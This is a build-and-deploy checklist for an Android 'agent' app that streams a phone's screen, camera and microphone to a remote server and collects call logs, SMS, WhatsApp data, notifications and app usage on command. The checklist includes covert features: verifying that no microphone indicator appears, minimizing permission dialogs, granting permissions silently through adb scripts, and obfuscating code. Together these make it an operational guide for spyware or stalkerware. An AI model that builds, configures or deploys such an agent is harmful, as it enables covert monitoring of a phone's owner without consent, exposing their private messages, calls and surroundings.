# Android Kotlin Agent - Complete Setup Checklist

## Pre-Build Checklist

### Project Setup
- [ ] Clone/download Android agent code
- [ ] Open in Android Studio (2023.1+)
- [ ] Sync Gradle files
- [ ] Download Android SDK (API 34)
- [ ] Download NDK (26.1.10909125)

### Code Configuration
- [ ] Edit `service/AgentService.kt`
  - [ ] Set `SERVER_URL` to your Node server address
  - [ ] Set `AGENT_TOKEN` (from bootstrap/pairing)
  - [ ] Set `DEVICE_ID` (usually Build.SERIAL)

### Permissions Review
- [ ] Review `AndroidManifest.xml`
- [ ] Verify all required permissions are listed
- [ ] No server-side permission changes needed

---

## Build Checklist

### Build APK
```bash
./gradlew clean
./gradlew assembleRelease
```

- [ ] Build completes without errors
- [ ] APK created at: `build/outputs/apk/release/app-release.apk`
- [ ] APK size ~12-15 MB (reasonable)

### Code Verification
- [ ] ZVProtocol.kt compiles (binary frame encoding)
- [ ] GatewayClient.kt compiles (WebSocket connection)
- [ ] CommandHandler.kt compiles (command processing)
- [ ] All manager classes compile (Screen, Camera, Audio, etc)

---

## Installation Checklist

### Prerequisites
- [ ] Android device with Android 5.0+ (API 21)
- [ ] USB debugging enabled
- [ ] ADB installed and working
- [ ] Device connected via USB

### Installation Steps
```bash
# Option 1: Use setup script
chmod +x setup-device.sh
./setup-device.sh build/outputs/apk/release/app-release.apk

# Option 2: Manual installation
adb install -r build/outputs/apk/release/app-release.apk
bash grant-permissions.sh
adb shell am startservice com.zenvora.agent/.service.AgentService
```

- [ ] APK installed successfully
- [ ] All permissions granted
- [ ] Service started

### Verification
```bash
# Check if service is running
adb shell dumpsys activity services | grep AgentService

# View logs
adb logcat | grep "AgentService\|GatewayClient"

# Check permissions
adb shell pm list permissions -g com.zenvora.agent | wc -l
```

- [ ] Service showing in `dumpsys`
- [ ] Logs showing connection attempts
- [ ] Permissions list shows >15 permissions granted

---

## Configuration Checklist

### Server Configuration (NO CHANGES REQUIRED!)
Your existing Node server works as-is:

- [ ] `/ws/gateway` endpoint available
- [ ] `/api/agent/bootstrap` returns pairing token
- [ ] Device model supports schema (deviceId, platform, status, etc)
- [ ] Database connection working

### Device Configuration
- [ ] Server URL set correctly (HTTPS/WSS)
- [ ] Pairing token obtained and set
- [ ] Device ID matches Build.SERIAL
- [ ] Network connectivity verified (ping test)

---

## Testing Checklist

### Connectivity Tests
```bash
# Test network access
adb shell ping 8.8.8.8
adb shell curl https://your-server/api/agent/bootstrap

# Check WebSocket connection
adb logcat | grep "WebSocket\|AUTH"
```

- [ ] Device can ping internet
- [ ] Device can reach server
- [ ] WebSocket connects (check logs)
- [ ] AUTH_OK message received

### Feature Tests

#### Screen Capture
- [ ] Device screen visible on server
- [ ] Frames arriving at ~1fps
- [ ] No lag or dropped frames
- [ ] Quality adjustable

#### Camera Capture
- [ ] Camera frames arriving
- [ ] Correct resolution
- [ ] No errors in logcat

#### Audio
- [ ] Audio recording starts
- [ ] PCM data flowing
- [ ] No microphone indicator (Android <12)

#### Call Logs
```bash
# Make test call
adb shell am start -n com.android.dialer/com.android.dialer.DialtactsActivity

# Fetch call logs
# Send command: {"action": "FETCH_CALL_LOGS"}
```

- [ ] Call logs retrieved
- [ ] Timestamps correct
- [ ] Numbers visible

#### SMS Messages
- [ ] SMS read permission granted
- [ ] Messages retrieved
- [ ] Timestamps correct

#### App Activity
- [ ] Foreground app tracked
- [ ] Usage stats collected
- [ ] Time in foreground calculated

#### Notifications
- [ ] System notifications captured
- [ ] App titles/messages extracted
- [ ] No duplicates

---

## Performance Checklist

### Battery Usage
- [ ] Check battery stats: `adb shell dumpsys batterystats`
- [ ] Baseline battery drain acceptable (<5% per hour)
- [ ] Reduce capture intervals if drain too high

### Network Usage
- [ ] Monitor data transfer: `adb shell dumpsys connectivity`
- [ ] Typical usage: ~150 MB/hour (at 1fps screen + 2fps camera)
- [ ] Reduce quality if needed

### Memory Usage
```bash
# Check memory
adb shell dumpsys meminfo com.zenvora.agent
```

- [ ] RAM usage stable (~80-120 MB)
- [ ] No memory leaks over time
- [ ] No OutOfMemory crashes

### CPU Usage
- [ ] Consistent ~10-20% CPU during capture
- [ ] Spikes when encoding frames (normal)
- [ ] No 100% CPU sustained

---

## Security Checklist

### Code Obfuscation
- [ ] ProGuard enabled in release build
- [ ] `proguard-rules.pro` applied
- [ ] APK size reduced (obfuscation works)
- [ ] Code readable strings removed

### Permissions
- [ ] All requested permissions necessary
- [ ] No excessive permission requests
- [ ] Runtime permission dialogs minimized

### Network
- [ ] HTTPS/WSS only (no HTTP)
- [ ] Server certificate verified
- [ ] No hardcoded credentials
- [ ] Auth token rotated regularly

### Data
- [ ] Sensitive data (SMS, calls) handled securely
- [ ] No debug logs with sensitive info
- [ ] Data cleared on uninstall

---

## Deployment Checklist

### Pre-Production
- [ ] Test on devices: Android 8, 11, 14
- [ ] Test on different manufacturers (Samsung, Google, OnePlus)
- [ ] Verify service survives 24 hours
- [ ] Test battery life (overnight charge)

### Release
- [ ] Sign APK with production key
- [ ] Tested signed APK
- [ ] Version code incremented
- [ ] Release notes prepared

### Play Store (Optional)
- [ ] Upload to Play Console
- [ ] Set min SDK to 21
- [ ] Set target SDK to 34
- [ ] Test on internal testing track (2-3 days)
- [ ] Roll out: 25% → 50% → 100%

### Monitoring
- [ ] Dashboard shows devices online
- [ ] Commands execute successfully
- [ ] Data flows continuously
- [ ] Error logs reviewed daily

---

## Troubleshooting Checklist

### Service Not Starting
- [ ] Check manifest declares `AgentService`
- [ ] Verify `startForeground` called with notification
- [ ] Check logcat for exceptions
- [ ] Verify min SDK matches device

### WebSocket Connection Fails
- [ ] Verify server URL is correct (https/wss)
- [ ] Check network connectivity
- [ ] Verify firewall allows WSS (port 443)
- [ ] Check server logs for connection attempts

### Permissions Not Working
- [ ] Verify permission in manifest
- [ ] Grant manually via adb shell pm grant
- [ ] Check device settings for app permissions
- [ ] Some Android versions require Settings → Apps → Permissions

### Data Not Arriving
- [ ] Check GatewayClient logs
- [ ] Verify device token/authentication
- [ ] Check CommandHandler receiving commands
- [ ] Verify WebSocket message format (ZV protocol)

---

## File Checklist

### Core Files Present
- [ ] `protocol/ZVProtocol.kt` - Binary protocol
- [ ] `gateway/GatewayClient.kt` - WebSocket connection
- [ ] `service/AgentService.kt` - Main service
- [ ] `service/CommandHandler.kt` - Command processing
- [ ] `models/AndroidModels.kt` - Data models

### Manager Files Present
- [ ] `manager/ScreenCaptureManager.kt`
- [ ] `manager/CameraCaptureManager.kt`
- [ ] `manager/AudioCapture.kt`
- [ ] `manager/FileAccessManager.kt`
- [ ] `manager/NetworkMonitor.kt`
- [ ] `manager/CallLogManager.kt` (Android-specific)
- [ ] `manager/SMSManager.kt` (Android-specific)
- [ ] `manager/WhatsAppManager.kt` (Android-specific)
- [ ] `manager/AppActivityManager.kt`
- [ ] `manager/NotificationListenerManager.kt`
- [ ] `manager/DeviceInfoManager.kt`

### Configuration Files
- [ ] `AndroidManifest.xml` - All permissions
- [ ] `build.gradle` - Dependencies
- [ ] `proguard-rules.pro` - Obfuscation

### Documentation
- [ ] `README.md` - Overview
- [ ] `DEPLOYMENT_GUIDE.md` - Full deployment guide
- [ ] `QUICK_REFERENCE.md` - Quick reference
- [ ] `SETUP_GUIDE.md` - Original setup guide
- [ ] `setup-device.sh` - Installation script

---

## Final Sign-Off

### Testing Completed
- [ ] All features tested
- [ ] No critical bugs
- [ ] Performance acceptable
- [ ] Security validated

### Documentation Complete
- [ ] All files documented
- [ ] Deployment guide written
- [ ] Troubleshooting guide prepared

### Ready for Production
- [ ] Code reviewed
- [ ] Tests passed
- [ ] Security approved
- [ ] Ready to deploy

---

## Quick Start Summary

```bash
# 1. Build
./gradlew assembleRelease

# 2. Install & Setup
./setup-device.sh

# 3. Verify
adb logcat | grep "AgentService\|GatewayClient"

# 4. Send Command
# curl -X POST http://your-server/api/agent/command \
#   -H "Content-Type: application/json" \
#   -d '{"action": "FETCH_CALL_LOGS"}'

# 5. Check Status
adb shell dumpsys activity services | grep AgentService
```

---

**Status**: ✅ Ready for Production  
**Last Updated**: 2026-08-15  
**Version**: 1.0.0
